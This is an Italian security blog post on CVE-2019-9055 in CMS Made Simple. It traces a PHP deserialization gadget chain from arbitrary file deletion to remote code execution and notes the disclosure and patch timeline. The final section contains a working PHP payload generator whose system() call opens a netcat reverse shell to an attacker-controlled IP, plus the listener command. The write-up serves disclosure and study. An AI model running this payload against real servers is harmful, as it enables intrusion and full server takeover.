
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">


    <link rel="shortcut icon" type="image/x-icon" href="/assets/img/favicon.ico">
    <link rel="image_src" href="/assets/img/loghi/logo_cmg_black_square.jpeg">
    <link rel="apple-touch-icon" sizes="144x144" href="/assets/img/loghi/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/assets/img/loghi/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/assets/img/loghi/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon" href="/assets/img/loghi/apple-touch-icon-57-precomposed.png">

    <title>CMS Made Simple deserialization attack (CVE-2019-9055) | Blog Certimeter Group</title><meta name="author" content="Daniele Scanu" />
<meta name="description" content="Dalla gestione degli errori a RCE" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

    <link href="/cache-buster-1589541212/assets/css/screen.css" media="screen" rel="stylesheet" type="text/css" />
<link href="/cache-buster-1561709048/bundles/app/js/ckeditor/plugins/codesnippet/lib/highlight/styles/default.css" media="screen" rel="stylesheet" type="text/css" />
            <!-- OPENGRAPH -->
        <meta property="og:title" content="CMS Made Simple deserialization attack (CVE-2019-9055)"/>
        <meta property="og:type" content="website" />
        <meta property="og:url" content="http://blog.certimetergroup.com/it/articolo/security/CMS_Made_Simple_deserialization_attack_%28CVE-2019-9055%29"/>
                    <meta name="image" property="og:image" content="http://blog.certimetergroup.com/_default_upload_bucket/image-thumb__159__cover_share/CMSMS-deserialization-attack-CVE-2019-9055.pjpeg"/>
                            <meta property="og:description" content="Dalla gestione degli errori a RCE"/>
                <meta property="og:site_name" content="Blog Certimeter Group"/>
        <!--// OPENGRAPH -->
                    <!-- Facebook -->
            <meta property="fb:app_id" content="320021555594004"/>
            <!--// Facebook -->
        
        <!-- Twitter -->
        <meta name="twitter:card" content="summary" />
        <meta name="twitter:title" content="CMS Made Simple deserialization attack (CVE-2019-9055)" />
                    <meta name="twitter:description" content="Dalla gestione degli errori a RCE" />
                            <meta name="twitter:image" content="http://blog.certimetergroup.com/_default_upload_bucket/image-thumb__159__cover_share/CMSMS-deserialization-attack-CVE-2019-9055.pjpeg" />
                <meta name="twitter:site" content="" />
        <!--// Twitter -->

        <!-- SCHEMA.org -->
        <meta itemprop="name" content="CMS Made Simple deserialization attack (CVE-2019-9055)">
                    <meta itemprop="description" content="Dalla gestione degli errori a RCE">
                            <meta itemprop="image" content="http://blog.certimetergroup.com/_default_upload_bucket/image-thumb__159__cover_share/CMSMS-deserialization-attack-CVE-2019-9055.pjpeg">
                <!--// SCHEMA.org -->
    </head>


<body class="d-flex flex-column h-100 blog">


<nav class="navbar custom-navbar navbar-expand-lg navbar-light bg-white sticky-top">
    <div class="container">
                                    <a class="navbar-brand" href="/it" title="CMS Made Simple deserialization attack (CVE-2019-9055)">
                                            <img src="/logo/image-thumb__189__default/CMG-BLOG-LOGO-NERO_1200.png" width="100"
                             alt="Certimeter Group">
                                    </a>
                            <div class="mobile-container">
            <a class="text-decoration-none text-dark search-box-btn d-inline d-lg-none">
                <span class="fa fa-search"></span>
            </a>
                        <button type="button" class="navbar-toggler navbar-toggle" data-toggle="collapse" data-target="#navbarText"
                    aria-expanded="false">
                <i class="fa fa-bars"></i>
                <i class="fa fa-times"></i>
                <span class="menu-text-close">MENU</span>
                <span class="menu-text-open">CHIUDI</span>
            </button>
        </div>
                <div class="collapse navbar-collapse" id="navbarText">
            <div class="d-lg-none">
                <ul class="navbar-nav">
                            <li style="border-color:#2980b9" class="nav-item  ">
        <a href="/it/categoria/software" class="nav-link " title="Software">Software</a>    </li>
        <li style="border-color:#c03a2b" class="nav-item  ">
        <a href="/it/categoria/security" class="nav-link " title="Security">Security</a>    </li>
        <li style="border-color:#16a084" class="nav-item  ">
        <a href="/it/categoria/data_analysis" class="nav-link " title="Data Analysis">Data Analysis</a>    </li>
        <li style="border-color:#fd00be" class="nav-item  ">
        <a href="/it/categoria/miscellaneous" class="nav-link " title="Miscellaneous">Miscellaneous</a>    </li>
        <li  class="nav-item  ">
        <a href="/it" class="nav-link " title="Home">Home</a>    </li>
                </ul>
            </div>
            <div class="d-none d-lg-block ml-auto">
                <ul class="navbar-nav">
                            <li style="border-color:#2980b9" class="nav-item  ">
        <a href="/it/categoria/software" class="nav-link " title="Software">Software</a>    </li>
        <li style="border-color:#c03a2b" class="nav-item  ">
        <a href="/it/categoria/security" class="nav-link " title="Security">Security</a>    </li>
        <li style="border-color:#16a084" class="nav-item  ">
        <a href="/it/categoria/data_analysis" class="nav-link " title="Data Analysis">Data Analysis</a>    </li>
        <li style="border-color:#fd00be" class="nav-item  ">
        <a href="/it/categoria/miscellaneous" class="nav-link " title="Miscellaneous">Miscellaneous</a>    </li>
        <li  class="nav-item  ">
        <a href="/it" class="nav-link " title="Home">Home</a>    </li>
                                            <li class="nav-item">
                            <a class="text-decoration-none text-dark search-box-btn">
                                <span class="fa fa-search"></span>
                            </a>
                        </li>
                                                        </ul>
            </div>
                    </div>
                    <div class="social-part">
                                    <a href="https://www.facebook.com/CertimeterGroup/" class="text-decoration-none fab fa-facebook-f" target="_blank" title="Facebook" aria-hidden="true"></a>                                    <a href="https://www.linkedin.com/company/certimetergroup" class="text-decoration-none fab fa-linkedin-in" target="_blank" title="Linkedin" aria-hidden="true"></a>                            </div>
                        <div class="search-box pl-5 pr-5 pt-2 pb-4 shadow-sm">
            <div class="row">
                <div class="col-12">
                   <form action="/it/search/value" class="form-inline form-search" method="get" accept-charset="UTF-8">
    <input type="text" class="form-control mb-2 mr-sm-2 w-100" name="q"
           placeholder="Inserisci testo e premi invio">
</form>
                </div>
            </div>
            <div class="row mt-3">
                <div class="col-12">
                    <h5 class="font-weight-light">Cerca per tag</h5>
                    <ul class="list-unstyled list-inline m-0">
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/CMS" title="CMS">
    <p class="m-0">
                    <small>
                    CMS                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/pimcore" title="pimcore">
    <p class="m-0">
                    <small>
                    pimcore                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/sviluppo" title="sviluppo">
    <p class="m-0">
                    <small>
                    sviluppo                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/machine%20learning" title="machine learning">
    <p class="m-0">
                    <small>
                    machine learning                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/data%20exfiltration" title="data exfiltration">
    <p class="m-0">
                    <small>
                    data exfiltration                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/pim" title="pim">
    <p class="m-0">
                    <small>
                    pim                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/marketing" title="marketing">
    <p class="m-0">
                    <small>
                    marketing                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/RCE" title="RCE">
    <p class="m-0">
                    <small>
                    RCE                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/artificial%20intelligence" title="artificial intelligence">
    <p class="m-0">
                    <small>
                    artificial intelligence                    </small>
            </p>
</a>
                                </div>
                            </li>
                                                    <li class="list-inline-item">
                                <div class="d-inline-block align-middle tags tags--small mb-2">
                                    <a href=" /it/tag/data%20viz" title="data viz">
    <p class="m-0">
                    <small>
                    data viz                    </small>
            </p>
</a>
                                </div>
                            </li>
                                            </ul>
                </div>
            </div>
        </div>
            </div>
</nav>




<!-- main-content -->
<main class="article main-content no-padding" id="content" role="main">
    <section class="section-spaced">
        <div class="container">
            <div class="row">
                <div class="col-12 col-lg-9 offset-lg-2">
                    <div class="article-top">
                        <div class="article-top-content">
                            <div class="row mb-2">
                                <div class="col-md-6 text-left">
                                    <span class="p-1 text-uppercase font-small" style="color: white; background-color: #c03a2b">
                                        Security                                    </span>
                                </div>
                                                            </div>
                            <h1 class="syncopate">
                                CMS Made Simple deserialization attack (CVE-2019-9055)                            </h1>
                            <h4>
                                Dalla gestione degli errori a RCE                            </h4>
                        </div>

                        <div class="clearfix text-muted">
                            <div class="float-left">
                                <div>
                                    Daniele Scanu                                                                            <small class="d-block">Gennaio, 2020</small>
                                                                    </div>
                            </div>
                            <div class="float-right">
                                
<ul class="list-unstyled list-inline">
    <li class="list-inline-item align-middle">
        <span class="text-blue">Condividi su</span>
    </li>
    <li class="list-inline-item align-middle">
        <a class="share" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.certimetergroup.com/it/articolo/security/CMS_Made_Simple_deserialization_attack_%28CVE-2019-9055%29&p=CMS%20Made%20Simple%20deserialization%20attack%20%28CVE-2019-9055%29" target="_blank">
            <i class="fab fa-facebook"></i>
        </a>
    </li>
    <li class="list-inline-item align-middle">
        <a class="share" href="https://twitter.com/share?text=CMS%20Made%20Simple%20deserialization%20attack%20%28CVE-2019-9055%29&url=http://blog.certimetergroup.com/it/articolo/security/CMS_Made_Simple_deserialization_attack_%28CVE-2019-9055%29" target="_blank">
            <i class="fab fa-twitter"></i>
        </a>
    </li>
    <li class="list-inline-item align-middle">
        <a class="share" href="https://www.linkedin.com/shareArticle?mini=true&url=http://blog.certimetergroup.com/it/articolo/security/CMS_Made_Simple_deserialization_attack_%28CVE-2019-9055%29&title=CMS%20Made%20Simple%20deserialization%20attack%20%28CVE-2019-9055%29" target="_blank">
            <i class="fab fa-linkedin"></i>
        </a>
    </li>
    <li class="list-inline-item align-middle">
        <a class="share" href="mailto:?Subject=CMG%20Blog%20-%20CMS%20Made%20Simple%20deserialization%20attack%20%28CVE-2019-9055%29&body=Penso%20che%20questo%20articolo%20possa%20interessarti%3A%20CMS%20Made%20Simple%20deserialization%20attack%20%28CVE-2019-9055%29%20-%20Dalla%20gestione%20degli%20errori%20a%20RCE%20%0A%0A%20Continua%20a%20leggere%20seguendo%20questo%20link%3A%20http%3A%2F%2Fblog.certimetergroup.com%2Fit%2Farticolo%2Fsecurity%2FCMS_Made_Simple_deserialization_attack_%2528CVE-2019-9055%2529%20%0A%0A%20Dal%20blog%20di%20Certimeter%20Group" target="_blank">
            <i class="fa fa-envelope"></i>
        </a>
    </li>
</ul>                            </div>
                        </div>
                        <div class="article-top-image mt-3 mb-3"
                             style="background-image: url('/_default_upload_bucket/image-thumb__158__default/CMSMS-deserialization-attack.pjpeg'); -moz-background-image: url('/_default_upload_bucket/image-thumb__158__default/CMSMS-deserialization-attack.pjpeg'); -o-background-image: url('/_default_upload_bucket/image-thumb__158__default/CMSMS-deserialization-attack.pjpeg'); -webkit-background-image: url('/_default_upload_bucket/image-thumb__158__default/CMSMS-deserialization-attack.pjpeg')">
                        </div>
                                                    <img class="d-none" src="/_default_upload_bucket/image-thumb__158__default/CMSMS-deserialization-attack.pjpeg" alt="CMS Made Simple deserialization attack (CVE-2019-9055)">
                                            </div>
                                            
<div class="article-tags">
    <ul class="list-unstyled list-inline">
        <li class="list-inline-item">
            Tags:
        </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/CMS%20Made%20Simple" title="CMS Made Simple">
    <p class="m-0">
                    CMS Made Simple            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/CMS" title="CMS">
    <p class="m-0">
                    CMS            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/RCE" title="RCE">
    <p class="m-0">
                    RCE            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/deserialization" title="deserialization">
    <p class="m-0">
                    deserialization            </p>
</a>
            </li>
            </ul>
</div>
                                        <div class="article-description">
                        <p style="text-align: justify;">&nbsp;Un payload appositamente creato concatenando diversi oggetti permette ad un attaccante di ottenere RCE (Remote Code Execution) tramite deserializzazione in <a data-tabindex-counter="8" data-tabindex-value="none" href="https://www.cmsmadesimple.org/" tabindex="-1">CMS Made Simple</a>, sfruttando il CVE 2019-9055.</p>

<h2>Impatti</h2>

<p style="text-align: justify;">In CMS Made Simple esistono tre gruppi o ruoli: <em>Admin</em>, <em>Editor</em> e <em>Designer</em>. Un attaccante con i permessi di <em>Admin</em> o <em>Designer</em> può abusare del modulo <a data-tabindex-counter="8" data-tabindex-value="none" href="https://docs.cmsmadesimple.org/layout/design-manager" tabindex="-1">Design Manager</a>, utile alla gestione del layout del CMS,&nbsp;per ottenere RCE. Questo è causato da una vulnerabilità di <strong>PHP deserialization</strong>. Al fine di&nbsp;ottenere Remote Code&nbsp;Execution, l'attaccante può modificare la richiesta di export di un layout (<em>export multiple templates to files</em>) con un payload che gli consenta di mandare in errore l'applicativo ed eseguire quindi la <code>destruct()</code> dell'oggetto contenuto nel payload stesso. La vulnerabilità è presente fino alla <strong>versione 2.2.9</strong> del CMS.</p>

<video autoplay="autoplay" class="full" controls="show" id="CMS-Made-Simple-Deserialization-attack-CVE-2019-9055.mp4" loop="loop" muted="muted" playsinline="" width="100%"><source src="/Articoli/CMSMS-deserialization-attack/CMS-Made-Simple-Deserialization-attack-CVE-2019-9055.mp4" type="video/mp4" /></video>

<h2>Introduzione</h2>

<p style="text-align: justify;">Durante un'analisi sul codice sorgente della versione 2.2.9, verificando l'implementazione della funzione <code>unserialize()</code>, abbiamo individuato alcuni metodi&nbsp;alcuni&nbsp;direttamente raggiungibili da parametri di richieste GET o POST. Una volta verificato che si trattasse veramente di vulnerabilità,&nbsp;sono state immediatamente&nbsp;notificate al vendor che le ha prontamente risolte, per poi renderle pubbliche con un CVE ID associato.&nbsp;Di seguito l'elenco delle vulnerabilità individuate in quella sessione di analisi:</p>

<ul>
	<li><a data-tabindex-counter="16" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9055" tabindex="-1">CVE-2019-9055</a></li>
	<li><a data-tabindex-counter="16" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9056" tabindex="-1">CVE-2019-9056</a></li>
	<li><a data-tabindex-counter="16" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9057" tabindex="-1">CVE-2019-9057</a></li>
	<li><a data-tabindex-counter="16" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9058" tabindex="-1">CVE-2019-9058</a></li>
	<li><a data-tabindex-counter="16" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9061" tabindex="-1">CVE-2019-9061</a></li>
</ul>

<h2>Cancellazione arbitraria di file</h2>

<p style="text-align: justify;">L'ovvia domanda che ci siamo posti è stata: "<em>è possibile sfruttare le vulnerabilità individuate in un qualche modo?</em>"</p>

<p style="text-align: justify;">Inizialmente abbiamo provato a cercare eventuali implementazioni a funzioni base, invocate normalmente durante il processo di deserializzazione, come ad esempio la <code>__wakeup()</code>&nbsp;o la&nbsp;<code>__destruct()</code>. La nostra attenzione si è subito spostata sul file <code>smarty_internal_template.php</code> (in <em>lib/smarty/sysplugin/</em>) che ha un'interessante implementazione della <code>__destruct()</code>.&nbsp;Inoltre, la classe&nbsp;fa parte del <em>namespace</em> della maggior parte delle classi del CMS ed è utilizzabile da tutte le <code>unserialize()</code> dei CVE sopra elencati.</p>

<pre>
<code class="language-php">/**
 * Template data object destructor
 */
public function __destruct()
{
    if ($this-&gt;smarty-&gt;cache_locking &amp;&amp; isset($this-&gt;cached) &amp;&amp; $this-&gt;cached-&gt;is_locked) {
      $this-&gt;cached-&gt;handler-&gt;releaseLock($this-&gt;smarty, $this-&gt;cached);
    }
}</code></pre>

<p style="text-align: justify;">Come è possibile&nbsp;osservare dal codice, all'interno del blocco <code>if</code>&nbsp;c'è la chiamata alla funzione <code>releaseLock()</code>&nbsp;sull'oggetto <code>cached-&gt;handler</code>. Cercando la stringa "<em>releaseLock</em>", è stata trovata un'implementazione&nbsp;all'interno del file <code>smarty_internal_cacheresource_file.php</code>, (sempre nella cartella in&nbsp;<em>lib/smarty/sysplugins/</em>) anch'essa presente nel <em>namespace</em> della maggior parte delle classi del CMS.</p>

<pre>
<code class="language-php">/**
 * Unlock cache for this template
 *
 * @param Smarty                 $smarty Smarty object
 * @param Smarty_Template_Cached $cached cached object
 *
 * @return bool|void
 */
public function releaseLock(Smarty $smarty, Smarty_Template_Cached $cached)
{
    $cached-&gt;is_locked = false;
    @unlink($cached-&gt;lock_id);
}</code></pre>

<p style="text-align: justify;">Come è possibile intuire leggendo il codice, la funzione cancella&nbsp;il file specificato nella variabile <code>$lock_id</code>&nbsp;dell'oggetto <code>cached</code>&nbsp;tramite la funzione <code>unlink()</code>. Questa chain ha un impatto molto alto poiché permette la <strong>cancellazione di un file arbitrario</strong> all'interno del sistema, implicando così la sua indisponibilità.</p>

<p style="text-align: justify;"><strong>Tutto molto carino ma non porta a Remote Code&nbsp;Execution o RCE!</strong></p>

<h2>Dalla gestione degli errori a&nbsp;RCE</h2>

<p style="text-align: justify;">Per ottenere RCE dovevamo individuare altre possibili chain quindi siamo andati avanti con la nostra ricerca finché&nbsp;non abbiamo trovato la seguente implementazione della funzione <code>__destruct()</code> nel file&nbsp;<code>class.dm_xml_reader.php</code>&nbsp;(in <em>modules/DesignManager/lib/</em>).</p>

<pre>
<code class="language-php">public function __destruct()
{
  if( $this-&gt;_old_err_handler )
    set_error_handler($this-&gt;_old_err_handler);
}</code></pre>

<p style="text-align: justify;">La particolarità di questa implementazione è l'utilizzo della funzione <code>set_error_handler()</code>&nbsp;che imposta una funzione "custom" come handler degli errori, ossia al verificarsi di un errore, viene eseguita la funzione specificata nella variabile <code>$_old_err_handler</code>.</p>

<p style="text-align: justify;">Questa <code>__destruct()</code>&nbsp;può essere utilizzata solo dalla <code>unserialize()</code> del <a data-tabindex-counter="8" data-tabindex-value="none" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9055" tabindex="-1">CVE-2019-9055</a>&nbsp;sul modulo <strong>Design Manager</strong> poiché è l'unica che ha il <em>namespace</em> in comune.</p>

<p style="text-align: justify;">Ci siamo dunque chiesti: "<em>come possiamo sfruttare questa gestione degli errori per eseguire codice remoto?</em>"</p>

<h2>Alla ricerca di un handler</h2>

<p style="text-align: justify;">Leggendo la <a data-tabindex-counter="16" data-tabindex-value="none" href="https://www.php.net/manual/en/function.set-error-handler.php" tabindex="-1">documentazione di PHP</a>, abbiamo scoperto che è possibile passare alla funzione <code>set_error_handler()</code>&nbsp;un array&nbsp;contenente un oggetto e un metodo di tale oggetto. Però, per fare qualcosa di utile&nbsp;come eseguire codice arbitrario, dobbiamo trovare dei metodi che usino una delle seguenti funzioni: <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>call_user_func()</code>, ecc.</p>

<p style="text-align: justify;">Quindi la nostra ricerca è proseguita fino a trovare una chiamata alla funzione <code>call_user_funct()</code> nel metodo <code>get_template_helptext()</code> della classe <code>CmsLayoutTemplateType</code> (in <em>lib/classes/</em>). Di seguito riportiamo la porzione di codice che ci interessa:</p>

<pre>
<code class="language-php">/**
 * Get HTML text for help with respect to the variables available in this template type.
 */
public function get_template_helptext()
{
    $text = null;
    $cb = $this-&gt;get_help_callback();
    $originator = $this-&gt;get_originator();
    $name = $this-&gt;get_name();
    if( $cb &amp;&amp; is_callable($cb) ) {
        $text = call_user_func($cb,$name);
        return $text;
    }

    ...
}</code></pre>

<p style="text-align: justify;">La funzione&nbsp;<code>get_template_helptext()</code>&nbsp;ci è sembrata un'ottima candidata, <strong>un ottimo anello per la nostra chain</strong>.&nbsp;Il payload che andremo a creare la potrà impostare&nbsp;come funzione da eseguire in caso di errore&nbsp;grazie alla&nbsp;<code>set_error_handler()</code>&nbsp;vista in precedenza.</p>

<p style="text-align: justify;">Ora ci occorre controllare&nbsp;la funzione <code>call_user_func()</code>. Come è possibile notare dal codice sopra, la funzione prende in input due variabili: <code>$cb</code> e <code>$name</code>. il contenuto di <code>$cb</code> deriva dalla funzione&nbsp;<code>get_help_callback()</code> che riportiamo di seguito.</p>

<pre>
<code class="language-php">/**
 * Return the callback used to retrieve help for this template type.
 *
 * @return mixed
 */
public function get_help_callback()
{
    if( isset($this-&gt;_data['help_callback']) ) return $this-&gt;_data['help_callback'];
}</code></pre>

<p style="text-align: justify;">Per manipolare la prima variabile, <code>$cb</code>, dobbiamo quindi agire su&nbsp;<code>_data['help_callback']</code>&nbsp;che è contenuto all'interno dell'oggetto serializzato e di conseguenza può essere modificato arbitrariamente, ad esempio perché&nbsp;contenga il riferimento alla funzione <code>system()</code> (<a data-tabindex-counter="8" data-tabindex-value="none" href="https://www.php.net/manual/en/function.system.php" tabindex="-1">system -&nbsp;Execute an external program and display the output</a>).</p>

<p style="text-align: justify;">Allo stesso modo, la seconda variabile di <code>get_template_helptext()</code>, <code>$name</code>, è controllata dalla funzione <code>get_name()</code> che riportiamo di seguito per comodità:</p>

<pre>
<code class="language-php">/**
 * Return the template type name.
 *
 * @return string the template type
 */
public function get_name()
{
    if( isset($this-&gt;_data['name']) ) return $this-&gt;_data['name'];
}</code></pre>

<p style="text-align: justify;">In questo caso&nbsp;è necessario controllare l'oggetto serializzato&nbsp;<code>_data['name']</code>.</p>

<p style="text-align: justify;">Ottimo! Abbiamo una chain completa e possiamo creare un payload in grado di eseguire comandi arbitrari sul nostro server impostando&nbsp;get_template_helptext() come funzione personalizzata per la gestione degli errori!</p>

<p style="text-align: justify;">Per far sì&nbsp;che il nostro payload venga eseguito ed ottenere RCE è necessario:</p>

<ul>
	<li>permettere l'esecuzione della <code>__destruct()</code>&nbsp;in modo che alla <code>set_error_handler()</code>&nbsp;venga impostato il gestore degli errori <code>get_template_helptext()</code>.</li>
	<li>mandare in errore il CMS in qualche punto perché&nbsp;il payload venga eseguito.</li>
</ul>

<p style="text-align: justify;">Però c'è un problema: la <code>__destruct()</code>&nbsp;viene eseguita quando lo script termina e a quel&nbsp;punto non si ha più controllo sull'esecuzione!</p>

<h2>The final payload</h2>

<p style="text-align: justify;">Per aggirare il problema è necessario far eseguire la funzione <code>__destruct()</code>&nbsp;<strong>prima</strong>&nbsp;della fine dello script. Per farlo, è possibile mandare in errore la <code>unserialize()</code> nel momento opportuno. L'idea di base è inserire, dopo la nostra chain, un qualche elemento che mandi in errore il parser della <code>unserialize()</code> eseguendo la <code>__destruct()</code> di tutti gli oggetti precedentemente deserializzati.</p>

<p style="text-align: justify;">Per raggiungere lo scopo ci viene in aiuto il formato con cui il PHP serializza gli oggetti. il sito PHP Internals Book,&nbsp;nella pagina <a data-tabindex-counter="8" data-tabindex-value="none" href="http://www.phpinternalsbook.com/php5/classes_objects/serialization.html" tabindex="-1">Serialization</a>,&nbsp;descrive il formato con cui vengono serializzati gli oggetti n PHP e i diversi meccanismi con cui vengono deserializzati.</p>

<p style="text-align: justify;">Per i nostri scopi è sufficiente sapere che il formato, per gli array serializzati, prevede l'uso del carattere <code>;</code> (punto e virgola) come separatore tra un elemento e il successivo. Se creiamo&nbsp;un array composto dai seguenti tre elementi:</p>

<ul>
	<li style="text-align: justify;">un'oggetto contenente il payload: <code>O:7:"Payload":0:{}</code></li>
	<li style="text-align: justify;">un intero: <code>i:5</code></li>
	<li style="text-align: justify;">un altro intero: <code>i:10</code></li>
</ul>

<p style="text-align: justify;">L'oggetto serializzato che ne deriva sarà il seguente:</p>

<pre>
<code class="language-json">a:3:{i:0;O:7:"Payload":0:{}i:1;i:5;i:2;i:10;}</code></pre>

<p style="text-align: justify;">Se il carattere <code>;</code>&nbsp;(punto e virgola) viene sostituito con un altro carattere, ad esempio il <code>#</code> (cancelletto),&nbsp;la <code>unserialize()</code> va in errore.</p>

<p style="text-align: justify;">In un oggetto serializzato come il seguente:</p>

<pre>
<code class="language-json">a:3:{i:0;O:7:"Payload":0:{}i:1;i:5#i:2;i:10;}</code></pre>

<p style="text-align: justify;">la <code>unserialize()</code>&nbsp;deserializza correttamente l'oggetto "Payload" e il secondo intero, 5, per poi lanciare un errore al momento di deserializzare il terzo elemento, l'interno 10. Sugli oggetti deserializzati prima dell'errore della <code>unserialize()</code> viene quindi eseguita la <code>__destruct()</code>.</p>

<p style="text-align: justify;">Di seguito il payload completo che apre una connessione con netcat sulla porta 2222 di una macchina sotto il nostro controllo con il comando :</p>

<pre>
<code class="language-php">&lt;?php
  class CmsLayoutTemplateType {
    private $_data;
    public function setData($arr) {
      $this-&gt;_data = $arr;
    }
  }

  class dm_xml_reader {
    private $_old_err_handler;
    function __construct($a) {
      $this-&gt;_old_err_handler = array($a, 'get_template_helptext');
    }
  }

  $p = new CmsLayoutTemplateType();
  $p-&gt;setData(array("help_callback" =&gt; "system", "name" =&gt; "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.1.100.9 2222 &gt;/tmp/f"));
  $payload = new dm_xml_reader($p);

  echo 'a:3:{i:0;' . serialize($payload) . 'i:1;i:5#i:2;i:5;}';

</code></pre>

<h2>La shell</h2>

<p style="text-align: justify;">A questo punto abbiamo un payload che imposta una funzione&nbsp;per la gestione degli errori definita da noi che a sua volta esegue una funzione che permette di eseguire codice arbitrario. Per sfruttare il payload dobbiamo trovare il modo di mandare in errore il CMS. Questo ci viene facile e gratuito. Osserviamo il codice della vulnerabilità di deserializzazione che dobbiamo sfruttare (quella relativa al CVE-2019-9055):</p>

<pre>
<code class="language-php">if( !isset($gCms) ) exit;
if( !$this-&gt;VisibleToAdminUser() ) return;
if( isset($params['allparams']) ) $params = array_merge($params,unserialize(base64_decode($params['allparams'])));
$this-&gt;SetCurrentTab('templates');</code></pre>

<p style="text-align: justify;">Se inseriamo il nostro payload codificato in Base64&nbsp;nella variabile POST <code>allparams</code>, questo viene decodificato e passato alla funzione <code>unserialize()</code>. Ma il payload è pensato per mandare in errore la <code>unserialize()</code> che restituirà alla funzione <code>array_merge()</code> il valore <code>null</code>. A questo punto anche la funzione <code>array_merge()</code> andrà in errore in quanto non si aspetta di unire un array valido con un valore nullo. La gestione di questo errore sarà finalmente fatta&nbsp;dalla funzione <code>get_template_helptext()</code>. A questo punto, se ci mettiamo in ascolto sulla porta 2222 ad esempio con <code>nc -lvnp 2222</code> riceveremo la connessione dal server come nel video all'inizio del post!</p>

<h2>Timeline</h2>

<table>
	<thead>
		<tr>
			<th>Data</th>
			<th>Cosa</th>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td>13 febbraio 2019</td>
			<td>La vulnerabilità è stata scoperta.</td>
		</tr>
		<tr>
			<td>18 febbraio 2019</td>
			<td>La vulnerabilità è stata segnalata agli sviluppatori.</td>
		</tr>
		<tr>
			<td>06 marzo 2019</td>
			<td>CMS Made Simple rilascia la patch con la versione 2.2.10.</td>
		</tr>
		<tr>
			<td>13 novembre 2019</td>
			<td>Viene rilasciato il modulo Metasploit.</td>
		</tr>
	</tbody>
</table>

<h2>Summary</h2>

<p style="text-align: justify;"><span style="text-align: justify;">Tutte le vulnerabilità di serializzazione individuate sono state risolte con l'uscita della <strong>versione 2.2.10</strong>. Infine, noi abbiamo sicuramente imparato qualcosina sulla gestione degli errori ;)</span></p>

<h2>Riferimenti</h2>

<ul>
	<li>CMS Made Simple: Design Manager (<a data-tabindex-counter="8" data-tabindex-value="none" href="https://docs.cmsmadesimple.org/layout/design-manager" tabindex="-1">https://docs.cmsmadesimple.org/layout/design-manager</a>)</li>
	<li>Documentazione PHP: set_error_handler (<a data-tabindex-counter="16" data-tabindex-value="none" href="https://www.php.net/manual/en/function.set-error-handler.php" tabindex="-1">https://www.php.net/manual/en/function.set-error-handler.php</a>)</li>
	<li>Documentazione PHP: system&nbsp;(<a data-tabindex-counter="8" data-tabindex-value="none" href="https://www.php.net/manual/en/function.system.php" tabindex="-1">https://www.php.net/manual/en/function.system.php</a>)</li>
	<li>PHP Internals Book: Serialization (<a data-tabindex-counter="8" data-tabindex-value="none" href="http://www.phpinternalsbook.com/php5/classes_objects/serialization.html" tabindex="-1">http://www.phpinternalsbook.com/php5/classes_objects/serialization.html</a>)</li>
	<li>Metasploit Module&nbsp;(<a data-tabindex-counter="16" data-tabindex-value="none" href="https://www.rapid7.com/db/modules/exploit/multi/http/cmsms_object_injection_rce" tabindex="-1">https://www.rapid7.com/db/modules/exploit/multi/http/cmsms_object_injection_rce</a>)</li>
	<li>Metasploit Wrap-up (<a data-tabindex-counter="16" data-tabindex-value="none" href="https://blog.rapid7.com/2019/11/15/metasploit-wrap-up-42/" tabindex="-1">https://blog.rapid7.com/2019/11/15/metasploit-wrap-up-42/</a>)</li>
</ul>
                    </div>
                                            
<div class="article-tags">
    <ul class="list-unstyled list-inline">
        <li class="list-inline-item">
            Tags:
        </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/CMS%20Made%20Simple" title="CMS Made Simple">
    <p class="m-0">
                    CMS Made Simple            </p>
</a>
            </li>
                    <li class="list-inline-item">
                <a href=" /it/tag/CMS" title="CMS">
